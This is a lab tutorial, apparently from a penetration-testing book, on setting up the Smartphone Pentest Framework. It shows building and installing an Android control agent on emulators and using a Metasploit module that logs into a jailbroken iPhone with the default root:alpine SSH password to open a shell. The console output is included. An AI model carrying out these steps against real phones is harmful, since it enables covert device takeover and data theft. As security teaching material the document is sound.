### Setting Up the Smartphone Pentest Framework (SPF)

#### Starting the Apache Server and MySQL Database
1. Ensure that the Apache server is running:
   ```bash
   root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service apache2 start
   ```

2. Verify that the MySQL database is started:
   ```bash
   root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service mysql start
   ```

#### Configuring SPF
The SPF framework can store information in either a MySQL or PostgreSQL database. For this setup, we will use MySQL.

1. Edit the SPF configuration file located at `/root/Smartphone-Pentest-Framework/frameworkconsole/config` to match your environment. The default configuration file is shown below:

   ```ini
   # SMARTPHONE PENTEST FRAMEWORK CONFIG FILE
   # ROOT DIRECTORY FOR THE WEBSERVER THAT WILL HOST OUR FILES
   WEBSERVER = /var/www
   # IP ADDRESS FOR WEBSERVER (webserver needs to be listening on this address)
   IPADDRESS = 192.168.20.9
   # IP ADDRESS TO LISTEN ON FOR SHELLS
   SHELLIPADDRESS = 192.168.20.9
   # IP ADDRESS OF SQLSERVER (127.0.0.1 IF LOCALHOST)
   MYSQLSERVER = 127.0.0.1
   # NMAP FOR ANDROID LOCATION
   ANDROIDNMAPLOC = /root/Smartphone-Pentest-Framework/nmap-5.61TEST4
   # EXPLOITS LOCATION
   EXPLOITSLOC = /root/Smartphone-Pentest-Framework/exploits
   ```

2. If your Kali IP address is different from `192.168.20.9`, update the `IPADDRESS` and `SHELLIPADDRESS` fields accordingly.

#### Running SPF
1. Navigate to the SPF directory and run the framework:
   ```bash
   root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# ./framework.py
   ```
   You should see the following menu:

   ```plaintext
   ################################################
   # Welcome to the Smartphone Pentest Framework! #
   # v0.2.6                                       #
   # Georgia Weidman/Bulb Security                #
   ################################################
   
   Select An Option from the Menu:
   1.) Attach Framework to a Deployed Agent/Create Agent
   2.) Send Commands to an Agent
   3.) View Information Gathered
   4.) Attach Framework to a Mobile Modem
   5.) Run a Remote Attack
   6.) Run a Social Engineering or Client-Side Attack
   7.) Clear/Create Database
   8.) Use Metasploit
   9.) Compile Code to Run on Mobile Devices
   10.) Install Stuff
   11.) Use Drozer
   0.) Exit
   spf>
   ```

2. To ensure that SPF can communicate with the database, clear and recreate the database tables by selecting option `7)`:
   ```plaintext
   spf> 7
   This will destroy all your data. Are you sure you want to? (y/N)? y
   ```

#### Android Emulators
In Chapter 1, we created three Android emulators. While some attacks work across different Android versions, specific client-side and privilege-escalation attacks are more effective on older versions. Since these are emulators, not all known Android exploits may be testable.

#### Attaching a Mobile Modem
SPF can use the mobile modem of an Android phone with the SPF app installed or a USB modem with a SIM card to send SMS messages. Additionally, it can deliver payloads via NFC if the Android device supports it.

#### Building the Android App
1. Choose option `4)` from the main menu to attach to a mobile modem.
2. Select `3)` to generate a smartphone-based app.
3. Choose the type of app to generate (e.g., `1)` for an Android App without NFC).
4. Enter the required details such as the phone number, control key, and webserver path.

Example:
```plaintext
spf> 4
Choose a type of modem to attach to:
1.) Search for attached modem
2.) Attach to a smartphone based app
3.) Generate smartphone based app
4.) Copy App to Webserver
5.) Install App via ADB
spf> 3
Choose a type of control app to generate:
1.) Android App (Android 1.6)
2.) Android App with NFC (Android 4.0 and NFC enabled device)
spf> 1
Phone number of agent: 15555215556
Control key for the agent: KEYKEY1
Webserver control path for agent: /androidagent1
Is this correct?(y/n) y
--snip--
BUILD SUCCESSFUL
Total time: 10 seconds
```

#### Deploying the App
1. To deploy the app on an Android emulator, choose option `5)` to install the app via ADB.
2. Select the appropriate device and app to install.

Example:
```plaintext
spf> 4
Choose a type of modem to attach to:
1.) Search for attached modem
2.) Attach to a smartphone based app
3.) Generate smartphone based app
4.) Copy App to Webserver
5.) Install App via ADB
spf> 5
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
List of devices attached
emulator-5554 device
emulator-5556 device
emulator-5558 device
Choose a device to install on: emulator-5554
Which App?
1.) Framework Android App with NFC
2.) Framework Android App without NFC
spf> 2
1463 KB/s (46775 bytes in 0.031s)
pkg: /data/local/tmp/FrameworkAndroidApp.apk
Success
```

#### Attaching the SPF Server and App
1. Choose option `2)` to attach to a smartphone-based app.
2. Provide the phone number, control key, and URL path.

Example:
```plaintext
spf> 4
Choose a type of modem to attach to:
1.) Search for attached modem
2.) Attach to a smartphone based app
3.) Generate smartphone based app
4.) Copy App to Webserver
5.) Install App via ADB
spf> 2
Connect to a smartphone management app. You will need to supply the phone number, the control key, and the URL path.
Phone Number: 15555215554
Control Key: KEYKEY1
App URL Path: /bookapp
Is this correct?(y/N): y
```

#### Running Remote Attacks
One example of a remote attack is testing for the default SSH password on a jailbroken iPhone. Follow these steps:

1. From the main SPF menu, choose `8)` to use Metasploit.
2. Select `1)` to run iPhone Metasploit modules.
3. Choose `1)` to test for the Cydia default SSH password.
4. Enter the IP address of the iPhone.

Example:
```plaintext
spf> 8
Runs smartphone-centric Metasploit modules for you.
Select An Option from the Menu:
1.) Run iPhone Metasploit Modules
2.) Create Android Meterpreter
3.) Setup Metasploit Listener
spf> 1
Select An Exploit:
1.) Cydia Default SSH Password
2.) Email LibTiff iOS 1
3.) MobileSafari LibTiff iOS 1
spf> 1
Logs in with alpine on a jailbroken iPhone with SSH enabled.
iPhone IP address: 192.168.20.13
[*] Initializing modules...
RHOST => 192.168.20.13
[*] 192.168.20.13:22 - Attempt to login as 'root' with password 'alpine'
[+] 192.168.20.13:22 - Login Successful with 'root:alpine'
[*] Found shell.
[*] Command shell session 1 opened (192.168.20.9:39177 -> 192.168.20.13:22) at 2015-03-21 14:02:44 -0400
ls
Documents
Library
Media
--snip--
```

This completes the setup and basic usage of the Smartphone Pentest Framework.